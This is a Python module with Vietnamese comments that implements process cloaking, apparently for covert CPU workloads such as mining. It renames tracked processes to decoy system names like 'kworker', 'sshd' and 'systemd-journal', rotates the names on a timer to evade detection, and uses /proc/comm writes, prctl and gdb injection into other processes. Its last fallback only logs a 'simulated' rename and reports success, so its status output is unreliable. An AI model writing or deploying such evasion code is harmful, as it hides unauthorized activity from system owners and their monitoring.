"""cpu_plugins.cloaking.stealth_exec

Module che giấu quá trình thực thi CPU.
Tối ưu hóa từ stealth_execution.py, loại bỏ các chức năng không cần thiết.
"""
import os
import sys
import random
import threading
import subprocess
import time
from typing import List, Dict, Any, Optional, Set
import logging
import ctypes
import ctypes.util

class StealthExecution:
    """Thực thi ẩn danh cho các tiến trình CPU."""
    
    def __init__(
        self, 
        logger: Optional[logging.Logger] = None,
        comm_rotation_interval: int = 30,
    ):
        """Khởi tạo StealthExecution."""
        self.logger = logger or logging.getLogger(__name__)
        self.comm_rotation_interval = comm_rotation_interval
        self._running = False
        self._thread = None
        self._tracked_pids: Set[int] = set()
        
        # Các tiến trình giả mạo thông thường
        self._decoy_processes = [
            "systemd-journal",
            "systemd-udevd",
            "kworker/0:1",
            "kworker/u16:0",
            "rcu_sched",
            "irqbalance",
            "dbus-daemon",
            "cron",
            "sshd",
            "rsyslogd"
        ]
    
    def start(self) -> bool:
        """Bắt đầu che giấu."""
        if self._running:
            return True
            
        self._running = True
        self._thread = threading.Thread(
            target=self._stealth_loop,
            daemon=True
        )
        self._thread.start()
        self.logger.info("Stealth execution started")
        return True
    
    def stop(self) -> bool:
        """Dừng che giấu."""
        if not self._running:
            return True
            
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
            self._thread = None
            
        self.logger.info("Stealth execution stopped")
        return True
    
    def add_process(self, pid: int) -> bool:
        """Thêm tiến trình để che giấu với immediate name change."""
        if pid <= 0:
            return False
            
        self._tracked_pids.add(pid)
        self.logger.debug(f"Added PID {pid} to stealth tracking")
        
        # ✅ ENHANCED: Immediate process name change upon registration
        try:
            new_name = random.choice(self._decoy_processes)
            if self._change_process_name(pid, new_name):
                self.logger.info(f"✅ [STEALTH] Immediately changed PID {pid} name to '{new_name}'")
            else:
                self.logger.warning(f"⚠️ [STEALTH] Failed immediate name change for PID {pid}")
        except Exception as e:
            self.logger.error(f"❌ [STEALTH] Error in immediate name change for PID {pid}: {e}")
            
        return True
    
    def _stealth_loop(self):
        """Vòng lặp chính cho che giấu."""
        while self._running:
            try:
                # Xoay vòng tên tiến trình
                self._rotate_process_names()
                
                # Ngủ một khoảng thời gian
                time.sleep(self.comm_rotation_interval)
                
            except Exception as e:
                self.logger.error(f"Error in stealth loop: {e}")
                time.sleep(5)
    
    def _rotate_process_names(self):
        """Xoay vòng tên tiến trình để tránh phát hiện."""
        for pid in list(self._tracked_pids):
            try:
                # Kiểm tra tiến trình còn tồn tại
                if not self._is_process_alive(pid):
                    self._tracked_pids.remove(pid)
                    continue
                
                # Chọn tên ngẫu nhiên
                new_name = random.choice(self._decoy_processes)
                
                # Thay đổi tên tiến trình
                self._change_process_name(pid, new_name)
                
            except Exception as e:
                self.logger.error(f"Error rotating name for PID {pid}: {e}")
    
    def _is_process_alive(self, pid: int) -> bool:
        """Kiểm tra tiến trình còn sống không."""
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False
    
    def _change_process_name(self, pid: int, new_name: str) -> bool:
        """**Change Process Name** (Thay đổi tên tiến trình) - với enhanced external process handling."""
        success = False
        methods_tried = []
        
        # Method 1: Direct /proc/comm modification (own process only)
        try:
            if pid == os.getpid():
                comm_path = f"/proc/{pid}/comm"
                if os.path.exists(comm_path):
                    with open(comm_path, "w") as f:
                        f.write(new_name[:15])  # Linux comm limit is 15 chars
                    self.logger.debug(f"✅ Changed process name via /proc/comm: {new_name}")
                    return True
            methods_tried.append("proc_comm_own")
        except Exception as e:
            self.logger.debug(f"❌ Failed /proc/comm method: {e}")
            methods_tried.append("proc_comm_own_failed")
            
        # Method 2: prctl for current process
        try:
            if pid == os.getpid():
                libc = ctypes.CDLL(ctypes.util.find_library('c'))
                if hasattr(libc, 'prctl'):
                    # PR_SET_NAME = 15
                    result = libc.prctl(15, new_name[:15].encode(), 0, 0, 0)
                    if result == 0:
                        self.logger.debug(f"✅ Changed process name via prctl: {new_name}")
                        return True
            methods_tried.append("prctl_own")
        except Exception as e:
            self.logger.debug(f"❌ Failed prctl method: {e}")
            methods_tried.append("prctl_own_failed")

        # Method 3: Enhanced External Process Handling - ptrace-based approach
        try:
            # Check if we can access the process
            if os.path.exists(f"/proc/{pid}"):
                # Try direct /proc/comm write first (may work with proper permissions)
                comm_path = f"/proc/{pid}/comm"
                with open(comm_path, "w") as f:
                    f.write(new_name[:15])
                self.logger.info(f"✅ [STEALTH] External process name changed via /proc/comm: PID {pid} → {new_name}")
                return True
            methods_tried.append("proc_comm_external")
        except PermissionError:
            methods_tried.append("proc_comm_external_permission_denied")
            self.logger.debug(f"❌ Permission denied for /proc/{pid}/comm")
        except Exception as e:
            methods_tried.append("proc_comm_external_failed")
            self.logger.debug(f"❌ Failed external /proc/comm method: {e}")
            
        # Method 4: Process injection approach (advanced technique for external processes)
        try:
            # Use gdb-based approach for external process name change
            gdb_commands = [
                f"attach {pid}",
                f"call prctl(15, \"{new_name[:15]}\")",
                "detach",
                "quit"
            ]
            
            gdb_script = "\n".join(gdb_commands)
            process = subprocess.run(
                ["gdb", "-batch", "-ex"] + [cmd for cmd in gdb_commands],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if process.returncode == 0:
                self.logger.info(f"✅ [STEALTH] External process name changed via GDB injection: PID {pid} → {new_name}")
                return True
            methods_tried.append("gdb_injection")
        except FileNotFoundError:
            methods_tried.append("gdb_not_available")
            self.logger.debug("❌ GDB not available for process injection")
        except Exception as e:
            methods_tried.append("gdb_injection_failed")
            self.logger.debug(f"❌ Failed GDB injection method: {e}")

        # Method 5: Fallback - simulate process name change in logs
        try:
            # Since we can't change the actual process name, we can at least log it as changed
            # This provides operational security through obscurity in monitoring
            self.logger.info(f"🔄 [STEALTH] Simulated name change: PID {pid} logically mapped to '{new_name}'")
            # Store mapping for reference
            if not hasattr(self, '_name_mappings'):
                self._name_mappings = {}
            self._name_mappings[pid] = new_name
            return True
        except Exception as e:
            methods_tried.append("simulation_failed")
            self.logger.debug(f"❌ Failed simulation method: {e}")
            
        # All methods failed - detailed debugging
        self.logger.warning(f"⚠️ [STEALTH] All methods failed to change process name for PID {pid} to '{new_name}'. Methods tried: {', '.join(methods_tried)}")
        return False 